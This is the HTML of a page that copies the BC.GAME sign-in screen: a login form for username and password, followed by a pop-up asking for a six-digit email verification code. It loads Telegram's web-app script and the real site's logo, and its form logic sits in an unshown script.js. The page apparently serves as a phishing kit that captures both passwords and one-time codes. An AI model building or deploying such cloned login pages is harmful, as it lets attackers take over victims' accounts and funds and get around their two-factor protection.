<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Sign In | BC.GAME</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <link rel="stylesheet" href="style.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
</head>
<body class="dark">
    <div class="main-wrapper" id="main-wrapper">
        <div class="login-modal">
            <div class="modal-header">
                <img src="https://bc.game/assets/logo.01f4640d.png" alt="BC.GAME" class="bc-logo">
                <div class="close-icon"><i class="fas fa-times"></i></div>
            </div>

            <h1 class="modal-title">Sign In</h1>

            <div class="tab-switcher">
                <div class="tab-item active" data-tab="password">
                    <i class="fas fa-lock"></i> Password
                </div>
                <div class="tab-item" data-tab="otp">
                    <i class="fas fa-mobile-alt"></i> One-time Code
                </div>
            </div>

            <div class="form-content">
                <div class="input-group">
                    <input type="text" id="main-identifier" placeholder="Email / Phone Number / Username" autocomplete="username">
                </div>

                <div class="input-group password-group" id="password-field">
                    <input type="password" id="login-password" placeholder="Password" autocomplete="current-password">
                    <div class="eye-icon"><i class="far fa-eye"></i></div>
                </div>

                <div class="forgot-link" id="forgot-link">Forgot your password?</div>

                <button class="main-submit-btn" id="btn-signin">Sign In</button>

                <div class="register-promo">
                    New to BC.GAME? <span class="accent-text">Create account</span>
                </div>

                <div class="direct-login-divider">
                    <span>Log in directly with</span>
                </div>

                <div class="passkey-btn">
                    <i class="fas fa-user-shield"></i> Sign In with passkey
                </div>

                <div class="social-icons">
                    <div class="social-icon"><i class="fab fa-google"></i></div>
                    <div class="social-icon"><i class="fab fa-facebook-f"></i></div>
                    <div class="social-icon"><i class="fab fa-telegram-plane"></i></div>
                    <div class="social-icon"><i class="fab fa-meta"></i></div>
                    <div class="social-icon"><i class="fab fa-whatsapp"></i></div>
                    <div class="social-icon"><i class="fab fa-line"></i></div>
                    <div class="social-icon"><i class="fab fa-steam"></i></div>
                </div>
            </div>
        </div>
    </div>

    <!-- OTP Verification Modal -->
    <div class="verify-overlay" id="otp-overlay" style="display: none;">
        <div class="verify-modal">
            <div class="verify-close"><i class="fas fa-times"></i></div>
            
            <div class="verify-icon-container">
                <i class="fas fa-envelope" id="verify-type-icon"></i>
            </div>

            <h2 class="verify-title" id="verify-title">Email Verification</h2>
            <p class="verify-desc" id="verify-desc">Please enter the 6-digit verification code sent on e-mail</p>

            <div class="verify-input-label">Verification Code</div>
            <div class="verify-input-wrapper">
                <input type="text" id="verify-code-input" placeholder="6-digit verification code">
                <button class="paste-btn">Paste</button>
            </div>

            <div class="resend-timer">Resend in <span id="resend-seconds">46</span>s</div>

            <button class="confirm-btn" id="btn-confirm">Confirm</button>
        </div>
    </div>

    <script src="script.js"></script>
</body>
</html>
